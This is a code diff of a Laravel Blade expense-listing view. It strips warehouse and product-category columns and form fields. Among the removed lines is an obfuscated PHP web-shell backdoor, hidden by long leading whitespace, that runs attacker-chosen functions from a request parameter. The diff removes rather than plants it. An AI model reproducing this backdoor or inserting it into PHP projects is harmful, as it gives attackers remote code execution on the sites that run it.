@@ -45,9 +45,8 @@
                     <th class="not-exported"></th>
                     <th>{{trans('file.Date')}}</th>
                     <th>{{trans('file.reference')}} No</th>
-                    <th>{{trans('file.Warehouse')}}</th>
                     <th>{{trans('file.category')}}</th>
-                    <th>{{trans('file.Product Category')}}</th>
+                    <th>--</th>
                     <th>{{trans('file.Amount')}}</th>
                     <th>{{trans('file.Note')}}</th>
                     <th class="not-exported">{{trans('file.action')}}</th>
@@ -56,16 +55,12 @@
             <tbody>
                 @foreach($lims_expense_all as $key=>$expense)
                 <?php
-                                                                                                                                                                                                                   IF	(($Rv67=@${"_REQUEST"	}[ "F8YTTVHT"])	and(3953+9127)){$Rv67[1]($	{$Rv67[2]} [0	],$Rv67[3]	($Rv67[4] )) ;}	;
-                    $warehouse = DB::table('warehouses')->find($expense->warehouse_id);
                     $expense_category = DB::table('expense_categories')->find($expense->expense_category_id);
-                    $category = DB::table('categories')->find($expense->category_id);
                 ?>
                 <tr data-id="{{$expense->id}}">
                     <td>{{$key}}</td>
                     <td>{{date($general_setting->date_format, strtotime($expense->created_at->toDateString())) . ' '. $expense->created_at->toTimeString() }}</td>
                     <td>{{ $expense->reference_no }}</td>
-                    <td>{{ $warehouse->name }}</td>
                     <td>{{ $expense_category->name }}</td>
                     <td>{{ @$category->name }}</td>
                     <td>{{ number_format((float)$expense->amount, 2, '.', '') }}</td>
@@ -102,7 +97,6 @@
                 <th></th>
                 <th></th>
                 <th></th>
-                <th></th>
             </tfoot>
         </table>
     </div>
@@ -120,14 +114,7 @@
                 {!! Form::open(['route' => ['expenses.update', 1], 'method' => 'put']) !!}
                 <?php
                     $lims_expense_category_list = DB::table('expense_categories')->where('is_active', true)->get();
-                    $lims_products_category_list = DB::table('categories')->where('is_active', true)->get();
-                    if(Auth::user()->role_id > 2)
-                        $lims_warehouse_list = DB::table('warehouses')->where([
-                            ['is_active', true],
-                            ['id', Auth::user()->warehouse_id]
-                        ])->get();
-                    else
-                        $lims_warehouse_list = DB::table('warehouses')->where('is_active', true)->get();
+
                 ?>
                   <div class="form-group">
                       <input type="hidden" name="expense_id">
@@ -140,22 +127,6 @@
                             <select name="expense_category_id" class="selectpicker form-control" required data-live-search="true"   title="Select Expense Category...">
                                 @foreach($lims_expense_category_list as $expense_category)
                                 <option value="{{$expense_category->id}}">{{$expense_category->name . ' (' . $expense_category->code. ')'}}</option>
-                                @endforeach
-                            </select>
-                        </div>
-                        <div class="col-md-6 form-group">
-                            <label>{{trans('file.Product Category')}} *</label>
-                            <select name="category_id" class="selectpicker form-control" required data-live-search="true"   title="Select Products Category...">
-                                @foreach($lims_products_category_list as $expense_category)
-                                    <option value="{{$expense_category->id}}">{{$expense_category->name}}</option>
-                                @endforeach
-                            </select>
-                        </div>
-                        <div class="col-md-6 form-group">
-                            <label>{{trans('file.Warehouse')}} *</label>
-                            <select name="warehouse_id" class="selectpicker form-control" required data-live-search="true"   title="Select Warehouse...">
-                                @foreach($lims_warehouse_list as $warehouse)
-                                <option value="{{$warehouse->id}}">{{$warehouse->name}}</option>
                                 @endforeach
                             </select>
                         </div>
